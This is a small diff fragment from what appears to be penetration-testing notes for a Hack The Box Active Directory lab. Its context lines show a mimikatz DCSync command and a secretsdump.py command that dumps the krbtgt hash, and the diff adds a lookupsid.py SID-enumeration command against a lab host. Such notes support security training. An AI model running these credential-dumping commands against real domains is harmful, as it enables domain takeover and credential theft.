@@ -492,6 +492,7 @@ lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 
 ```
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
 ```
 
   
